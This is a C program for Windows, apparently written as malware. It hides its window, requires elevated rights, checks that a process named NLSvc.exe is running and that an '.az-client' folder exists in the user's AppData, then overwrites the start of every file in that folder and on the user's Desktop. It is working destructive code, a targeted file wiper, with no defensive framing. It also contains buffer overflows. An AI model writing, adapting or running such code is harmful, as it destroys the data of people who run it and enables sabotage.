# include <stdio.h>
# include <windows.h>
# include <securitybaseapi.h>
# include <Lmcons.h>
# include <tlhelp32.h>

# define c_user 	"C:\\Users\\"
# define c_appdata	"\\AppData\\Roaming\\.az-client"
# define desktop	"\\desktop"
# define nlsvc		"NLSvc.exe"


void exitsys( )
{
	//system( "PAUSE" );
	exit( -1 );
}


void rewriter( const char *dir ) 
{
    	WIN32_FIND_DATA findFileData;
    	HANDLE hFind;
    	char path[MAX_PATH];

    	// Créer un modèle de recherche pour le répertoire spécifié
    	sprintf( path, "%s\\*", dir );
    	hFind = FindFirstFile( path, &findFileData );

    	if ( hFind == INVALID_HANDLE_VALUE ) 
    	{
        	//printf("Impossible d'ouvrir le repertoire %s\n", dir );
        	//exitsys();
    	}

    	// Parcourir tous les fichiers et sous-dossiers
    	do {
        	// Construire le chemin complet du fichier ou du sous-dossier
        	sprintf( path, "%s\\%s", dir, findFileData.cFileName );

        	// Vérifier si c'est un dossier
        	if ( findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ) 
		{
            		// Ignorer les dossiers spéciaux "." et ".."
            		if ( strcmp( findFileData.cFileName, "." ) != 0 && strcmp( findFileData.cFileName, ".." ) != 0 ) 
	    		{
                		// Appeler récursivement la fonction pour le sous-dossier
                		rewriter( path );
            		}
        	} else {
            		// Ouvrir le fichier en mode lecture/écriture binaire
            		FILE *file = fopen( path, "r+b" );
            		if ( file == NULL ) 
	    		{
                		//printf( "Impossible d'ouvrir le fichier %s\n", path );
                		continue;
            		}
            
            		// Écrire 64 caractères 'A' au début du fichier
            		char buffer[64];
            		memset( buffer, 'A', 96 );
            		fseek( file, 0, SEEK_SET );
            		fwrite( buffer, sizeof( char ), 64, file );
            
            		// Fermer le fichier
            		fclose( file );
        	}
    	} while ( FindNextFile( hFind, &findFileData ) != 0 );

    	// Fermer la poignée de recherche
    	FindClose( hFind );
}


int main( ) 
{
	// Hide Window
	HWND hwnd = GetConsoleWindow(); 
    	ShowWindow( hwnd, SW_HIDE );

	// Create mutex
	HANDLE hMutex = CreateMutex( NULL, FALSE, "nutnut" );
	if ( GetLastError() == ERROR_ALREADY_EXISTS ) 
	{
		CloseHandle( hMutex );
		// printf( "[x] Mutex already exists.\n" );
		exitsys();
	}	
	// printf( "[+] Mutex created.\n" );

	// Check elevation
	BOOL fRet = FALSE;
    	HANDLE hToken = NULL;
    	if( OpenProcessToken( GetCurrentProcess( ), TOKEN_QUERY, &hToken ) )
	{
        	TOKEN_ELEVATION Elevation;
        	DWORD cbSize = sizeof( TOKEN_ELEVATION );
        	if( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) ) 
		{
            		fRet = Elevation.TokenIsElevated;
        	}
    	}
	if( hToken )
		CloseHandle( hToken );	
	if ( fRet == FALSE )
	{
		// printf( "[x] Process not elevated.\n" );
		exitsys();
	}	
	// printf( "[+] Process elevated.\n" );


	// Check if NLSvc.exe running
	PROCESSENTRY32 entry;
        entry.dwSize = sizeof( PROCESSENTRY32 );

        HANDLE snapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0X00 );

        if ( Process32First( snapshot, &entry ) == ( 0X01 ) )
        {
                while ( Process32Next( snapshot, &entry ) == ( 0X01 ) )
                {
                        if ( stricmp( entry.szExeFile, nlsvc ) == 0X00 )
                        {
                                // printf( "[+] %s services found, PID: %ld\n", nlsvc, entry.th32ProcessID );
                                break;
                        }
                } if ( stricmp( entry.szExeFile, nlsvc ) != 0X00 ) {
                        // printf( "[x] %s services not found.\n", nlsvc );
                        exitsys();
                }
        }
        CloseHandle( snapshot );

	// Check if AZ launcher exist
	char username[UNLEN+1];
	DWORD username_len = UNLEN+1;
	GetUserNameA( username, &username_len );
	char *az_folder;
        az_folder = (char*)malloc( strlen( c_user ) + strlen( username ) + strlen( c_appdata ) );
        strcpy( az_folder, c_user );
        strcat( az_folder, username );
        strcat( az_folder, c_appdata );	
	DWORD ftyp = GetFileAttributesA( az_folder );
        if ( ftyp == INVALID_FILE_ATTRIBUTES ) 
	{
		//printf( "[x] Folder does not exist.\n" );
		exitsys();
	}	
	if ( ftyp & FILE_ATTRIBUTE_DIRECTORY );
	//printf( "[+] Az folder founded.\n" );

	// Rewrite az_folder
	rewriter( az_folder );
	free( az_folder );

	// Rewrite user desktop
	char* user_desktop;
	user_desktop = (char*)malloc( strlen( c_user ) + strlen( username ) + strlen( desktop ) );
	strcpy( user_desktop, c_user );
	strcat( user_desktop, username );
	strcat( user_desktop, desktop );	
	rewriter( user_desktop );
	free( user_desktop );

	exitsys();	
}
